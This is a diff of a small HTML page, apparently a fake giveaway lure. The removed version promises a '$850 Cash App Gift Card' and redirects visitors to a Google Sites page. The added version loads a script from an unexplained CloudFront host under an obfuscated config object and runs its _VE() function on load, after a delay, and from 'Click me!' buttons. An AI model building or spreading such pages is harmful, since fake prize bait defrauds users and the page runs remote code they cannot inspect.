@@ -1,20 +1,8 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get a $850 Cash App Gift Card HERE!</title>
-    
-    <meta property="og:image" content="https://ibb.co.com/y6KSP8n">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-</head>
-<body>
-
-    <script type="text/javascript">
-            window.location.href = "https://sites.google.com/view/getacashapp850giftcardhere/home"
-        </script>
-
-</body>
-
-</html>
+<script type="text/javascript">
+    var fgAYa_oPX_YIojMc={"it":4444449,"key":"1c198"};
+</script>
+<script src="https://d29gqhzevia104.cloudfront.net/92449d8.js"></script>
+<script>_VE();</script>
+<script>setTimeout(_VE, 5000);</script>
+<button onclick="_VE()">Click me!</button>
+<button onclick="setTimeout(_VE, 5000);">Click me!</button>
